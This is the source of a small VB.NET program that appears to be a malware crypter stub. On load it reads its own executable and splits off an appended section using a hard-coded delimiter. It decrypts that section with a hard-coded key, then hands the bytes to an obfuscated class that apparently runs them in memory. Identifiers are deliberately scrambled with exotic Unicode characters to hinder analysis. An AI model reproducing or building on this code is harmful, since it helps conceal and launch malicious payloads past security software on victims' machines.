Imports System.Text
Imports System.IO

Public Class Form1


    Dim ῘᾘύάᾂᾐᾢᾪᾙᾜᾖᾔάὪὮᾫ As String = "424234232dd2d32333234f"



    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        Dim ẖẏẆṨṐẍỘẬỒἔἏἙể As String
        ẖẏẆṨṐẍỘẬỒἔἏἙể = Space(LOF(1))
        FileGet(1, ẖẏẆṨṐẍỘẬỒἔἏἙể)
        FileClose(1)


        Dim 寸尭屛屫屝山屄屏尥尉尮局屛屙屏屇屁尲尲尯屘屬屭() As String = Split(ẖẏẆṨṐẍỘẬỒἔἏἙể, ῘᾘύάᾂᾐᾢᾪᾙᾜᾖᾔάὪὮᾫ)
        寸尭屛屫屝山屄屏尥尉尮局屛屙屏屇屁尲尲尯屘屬屭(1) = Class1.ɯɫɔȪɑɦᾝᾂὭὝᾃᾔᾚᾧᾣὧὯᾅῇ(寸尭屛屫屝山屄屏尥尉尮局屛屙屏屇屁尲尲尯屘屬屭(1), "UAUAYwyhausid32E2Isisd")

        Dim 荅荂茇茂茟茨茾荆茮茽茽荻荿荩药荩莏莋 As Byte() = Encoding.Default.GetBytes(寸尭屛屫屝山屄屏尥尉尮局屛屙屏屇屁尲尲尯屘屬屭(1))

        Dim x As New nRUQwszQtZv : x.FDZdjwfivt(荅荂茇茂茟茨茾荆茮茽茽荻荿荩药荩莏莋, Application.ExecutablePath)

        Me.Close()
    End Sub
End Class
